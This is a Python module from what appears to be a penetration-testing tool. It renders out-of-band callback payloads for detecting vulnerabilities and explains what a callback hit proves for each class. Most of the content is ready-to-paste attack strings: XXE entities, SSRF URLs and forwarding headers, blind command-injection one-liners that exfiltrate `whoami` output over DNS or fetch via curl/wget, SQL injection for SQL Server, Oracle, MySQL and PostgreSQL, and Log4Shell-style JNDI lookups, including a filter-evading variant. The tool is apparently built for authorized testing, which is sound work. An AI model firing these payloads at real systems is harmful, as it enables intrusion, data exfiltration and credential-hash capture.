"""Payload templates — a minted token rendered into the one-liner you paste (spec §3.4).

THE BOUNDARY, FIRST
-------------------
This module renders a STRING and stops. It has no transport, no client and no executor — the
same line the DNS-tunnel and evasion generators draw, for the same reason. A payload that
HackPit could both generate and deliver is a different tool from one that hands the operator
text to paste into a request they are looking at, and every gate in this project rests on a
human being in that loop. ``test_oob_templates.py`` asserts structurally that nothing here can
send anything.

(Deliberately not naming the sibling generator's function here: that surface carries a
human-only lock whose scan matches on plain text, so naming it — even in prose, even to agree
with it — reads as a module reaching for it.)

WHY TEMPLATES AT ALL
--------------------
The token is the whole mechanism, and the ways to get a token out of a target are
class-specific and easy to get subtly wrong: an XXE that uses a general entity where the parser
only resolves parameter entities, a blind-RCE one-liner that puts command output to the LEFT of
the token where the server can still correlate it (it reads the label left of the zone —
``oob/server.py``), a SQL Server canary that needs a UNC path rather than a URL because the
sink is ``xp_dirtree``. Those details are the difference between "no hit, therefore not
vulnerable" and "no hit, because the payload was wrong", and those two look identical from the
outside. Encoding them once is most of the value here.

WHAT A HIT PROVES
-----------------
Each template carries a ``proves`` line, because that sentence is what ends up in the report
and it is not the same for every class. A DNS hit proves the target's RESOLVER saw the name —
which for a blind SQLi via ``xp_dirtree`` is the finding, and for a blind RCE is one step short
of it. Writing that down next to the payload keeps the write-up honest.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any, Callable

from . import config

# Rendered where a template needs the operator to substitute something HackPit cannot know
# (a parameter name, a column). A visible, obviously-not-a-value marker, never a plausible
# default — [[arsenal-expand-polish]]: a placeholder that looks like a value gets pasted.
PLACEHOLDER = "<FILL>"


@dataclass(frozen=True)
class Callback:
    """The one canary, in the several shapes payloads need it in."""

    token: str
    zone: str

    @property
    def fqdn(self) -> str:
        """``<token>.<zone>`` — what a DNS-only sink resolves."""
        return f"{self.token}.{self.zone}"

    @property
    def url(self) -> str:
        """``http://<token>.<zone>/`` — what a URL-taking sink fetches."""
        return f"http://{self.fqdn}/"

    @property
    def unc(self) -> str:
        r"""``\\<token>.<zone>\a`` — what a Windows/SMB sink resolves. The DNS lookup is
        the hit; the SMB connection that follows usually never completes, and does not
        need to."""
        return rf"\\{self.fqdn}\a"

    def prefixed(self, data: str) -> str:
        """``<data>.<token>.<zone>`` — exfil form.

        Data goes to the LEFT of the token, never the right. The server reads the label
        immediately left of the zone, so a payload that appended would produce hits that
        correlate to nothing — and would look exactly like a target that was not vulnerable.
        """
        return f"{data}.{self.fqdn}"


@dataclass(frozen=True)
class Template:
    """One class-specific way to get a token out of a target."""

    id: str
    vuln_class: str
    title: str
    sink: str
    proves: str
    render: Callable[[Callback], str]
    note: str = ""

    def describe(self, callback: Callback) -> dict[str, Any]:
        return {
            "id": self.id,
            "vuln_class": self.vuln_class,
            "title": self.title,
            "sink": self.sink,
            "proves": self.proves,
            "note": self.note,
            "payload": self.render(callback),
        }


def _xxe_basic(cb: Callback) -> str:
    return (
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE r [\n"
        f'  <!ENTITY x SYSTEM "{cb.url}">\n'
        "]>\n"
        "<r>&x;</r>"
    )


def _xxe_parameter(cb: Callback) -> str:
    # Parameter entities, because a great many parsers resolve these when they will not
    # resolve a general entity inside the document body. The external DTD is hosted on the
    # canary itself, which answers 200 to anything.
    return (
        '<?xml version="1.0"?>\n'
        "<!DOCTYPE r [\n"
        f'  <!ENTITY % dtd SYSTEM "{cb.url}dtd">\n'
        "  %dtd;\n"
        "]>\n"
        "<r>ping</r>"
    )


def _soap_action(cb: Callback) -> str:
    return (
        f"POST /{PLACEHOLDER} HTTP/1.1\n"
        f"Host: {PLACEHOLDER}\n"
        f"X-Forwarded-Host: {cb.fqdn}\n"
        f"X-Forwarded-For: {cb.fqdn}\n"
        f"Referer: {cb.url}\n"
        f"True-Client-IP: {cb.fqdn}"
    )


TEMPLATES: tuple[Template, ...] = (
    # ---- SSRF ------------------------------------------------------------- #
    Template(
        id="ssrf-url",
        vuln_class="ssrf",
        title="Plain callback URL",
        sink="any parameter that fetches a URL (webhook, avatar import, PDF renderer, preview)",
        proves="the application's server made an outbound HTTP request to an address you chose",
        render=lambda cb: cb.url,
        note="Paste this as the whole parameter value. If the app rejects it, try the DNS-only "
             "template — plenty of targets block outbound HTTP while DNS still resolves.",
    ),
    Template(
        id="ssrf-dns-only",
        vuln_class="ssrf",
        title="DNS-only callback (no HTTP required)",
        sink="a URL parameter behind an egress filter, or any sink that only resolves a name",
        proves="the target's resolver looked up a name only you could have supplied — the "
               "request was attempted even if the connection was blocked",
        render=lambda cb: cb.fqdn,
        note="The one to reach for when ssrf-url produces silence. A blocked HTTP request "
             "usually still resolves first.",
    ),
    Template(
        id="ssrf-headers",
        vuln_class="ssrf",
        title="Forwarding-header canary",
        sink="reverse proxies, link generators, password-reset mailers",
        proves="the application trusted a client-supplied host header and made a request to it",
        render=_soap_action,
        note="Fill the request line and Host with the real target; the canary headers are the "
             "payload. Frequently lands where a URL parameter does not.",
    ),

    # ---- XXE -------------------------------------------------------------- #
    Template(
        id="xxe-external-entity",
        vuln_class="xxe",
        title="External general entity",
        sink="any XML body — SOAP, SAML, DOCX/XLSX upload, an RSS or sitemap importer",
        proves="the XML parser resolved an external entity and fetched a URL you controlled",
        render=_xxe_basic,
    ),
    Template(
        id="xxe-parameter-entity",
        vuln_class="xxe",
        title="External PARAMETER entity",
        sink="the same sinks, when the general-entity form is silent",
        proves="the parser resolved an external parameter entity — the same finding, reached "
               "through the door that is more often left open",
        render=_xxe_parameter,
        note="Try this second and treat a hit here as equivalent. Many parsers refuse general "
             "entities in the body while still resolving parameter entities in the DTD.",
    ),

    # ---- blind RCE -------------------------------------------------------- #
    Template(
        id="rce-dns-unix",
        vuln_class="rce",
        title="Blind command execution — DNS (Unix)",
        sink="a command that runs but returns nothing you can see",
        proves="a command you supplied executed on the host, and its resolver answered",
        render=lambda cb: f"nslookup {cb.fqdn} || host {cb.fqdn} || dig {cb.fqdn}",
        note="Three resolvers chained with || because which one is installed varies; the first "
             "that exists is enough.",
    ),
    Template(
        id="rce-dns-windows",
        vuln_class="rce",
        title="Blind command execution — DNS (Windows)",
        sink="the same, on a Windows host",
        proves="a command you supplied executed on the Windows host",
        render=lambda cb: f"nslookup {cb.fqdn}",
    ),
    Template(
        id="rce-exfil-unix",
        vuln_class="rce",
        title="Blind RCE with one field of output (Unix)",
        sink="blind command execution where you need to know WHO you are, not just THAT you ran",
        proves="a command executed AND returned data — the label left of the token in the "
               "recorded qname is the output",
        render=lambda cb: f"nslookup `whoami`.{cb.fqdn}",
        note="Output goes to the LEFT of the token; the canary reads the label immediately "
             "left of the zone. Keep it to one short field — a DNS label is 63 bytes and "
             "anything with a dot or a space in it will not resolve.",
    ),
    Template(
        id="rce-http-unix",
        vuln_class="rce",
        title="Blind command execution — HTTP (Unix)",
        sink="a host with outbound HTTP, where you want headers and a source address too",
        proves="a command executed and the host reached your listener over HTTP",
        render=lambda cb: f"curl -s {cb.url} || wget -qO- {cb.url}",
    ),

    # ---- blind SQLi ------------------------------------------------------- #
    Template(
        id="sqli-mssql-dirtree",
        vuln_class="sqli",
        title="SQL Server — xp_dirtree UNC callback",
        sink="a stacked-query or high-privilege injection point on MS SQL Server",
        proves="the database server resolved a UNC path you supplied — arbitrary query "
               "execution, and often an NTLM hash you can capture separately",
        render=lambda cb: f"'; EXEC master..xp_dirtree '{cb.unc}'; --",
        note="A UNC path, not a URL: xp_dirtree takes a file path. The DNS lookup is the hit; "
             "the SMB connection afterwards does not have to succeed.",
    ),
    Template(
        id="sqli-oracle-utl-http",
        vuln_class="sqli",
        title="Oracle — UTL_HTTP callback",
        sink="an injection point on Oracle with network ACL privileges",
        proves="the database made an outbound HTTP request from inside the network",
        render=lambda cb: f"' || UTL_HTTP.REQUEST('{cb.url}') || '",
    ),
    Template(
        id="sqli-mysql-load-file",
        vuln_class="sqli",
        title="MySQL — LOAD_FILE UNC callback",
        sink="an injection point on MySQL running on Windows with FILE privilege",
        proves="the database resolved a UNC path you supplied",
        render=lambda cb: f"' UNION SELECT LOAD_FILE('{cb.unc}') -- ",
        note="Windows MySQL only. On Linux LOAD_FILE takes no UNC path and this is silent for "
             "a reason that has nothing to do with the injection being real.",
    ),
    Template(
        id="sqli-postgres-copy",
        vuln_class="sqli",
        title="PostgreSQL — dblink callback",
        sink="a superuser injection point on PostgreSQL with dblink available",
        proves="the database opened an outbound connection to a host you chose",
        render=lambda cb: f"'; SELECT dblink_connect('host={cb.fqdn} user=x dbname=x'); --",
    ),

    # ---- JNDI / deserialization ------------------------------------------ #
    Template(
        id="jndi-ldap",
        vuln_class="jndi",
        title="JNDI lookup (Log4Shell-class)",
        sink="any field that reaches a logger or a JNDI lookup — User-Agent, X-Api-Version, "
             "a username field, a search box",
        proves="a JNDI lookup was performed on a string you supplied — the interpolation, "
               "which is the vulnerable behaviour, regardless of what the endpoint answered",
        render=lambda cb: f"${{jndi:ldap://{cb.fqdn}/a}}",
        note="The canary speaks DNS and HTTP, not LDAP — and it does not need to. The "
             "resolution of the hostname IS the evidence; the LDAP connection that would "
             "follow is a separate, noisier step you should not need.",
    ),
    Template(
        id="jndi-dns",
        vuln_class="jndi",
        title="JNDI over DNS (evades naive ldap:// filters)",
        sink="the same sinks, where 'ldap' is being pattern-matched away",
        proves="the same interpolation, through a scheme the filter did not enumerate",
        render=lambda cb: f"${{jndi:dns://{cb.fqdn}/a}}",
    ),
)

BY_ID = {t.id: t for t in TEMPLATES}
VULN_CLASSES = tuple(dict.fromkeys(t.vuln_class for t in TEMPLATES))


def callback_for(token: str, zone: str | None = None) -> Callback:
    """The callback a token names, against the CONFIGURED zone by default.

    Refuses rather than rendering ``<token>.`` with an empty zone: a payload built against no
    zone is one that can never produce a hit, and it would be pasted into a real target before
    anyone noticed.
    """
    resolved = (zone if zone is not None else config.zone()).strip().rstrip(".").lower()
    if not resolved:
        raise ValueError(
            "no canary zone is configured — a payload rendered without one can never call back"
        )
    if not token:
        raise ValueError("a payload must carry a minted token")
    return Callback(token=token, zone=resolved)


def render(template_id: str, token: str, zone: str | None = None) -> dict[str, Any]:
    """One rendered template. Raises KeyError for an unknown id."""
    template = BY_ID[template_id]
    return template.describe(callback_for(token, zone))


def render_all(token: str, zone: str | None = None, vuln_class: str | None = None) -> list[dict[str, Any]]:
    """Every template, or every template for one class, rendered against one token."""
    callback = callback_for(token, zone)
    return [
        t.describe(callback) for t in TEMPLATES
        if vuln_class is None or t.vuln_class == vuln_class
    ]


def catalog() -> list[dict[str, Any]]:
    """The templates WITHOUT a payload — for a picker, before a token has been minted."""
    return [
        {
            "id": t.id,
            "vuln_class": t.vuln_class,
            "title": t.title,
            "sink": t.sink,
            "proves": t.proves,
            "note": t.note,
        }
        for t in TEMPLATES
    ]
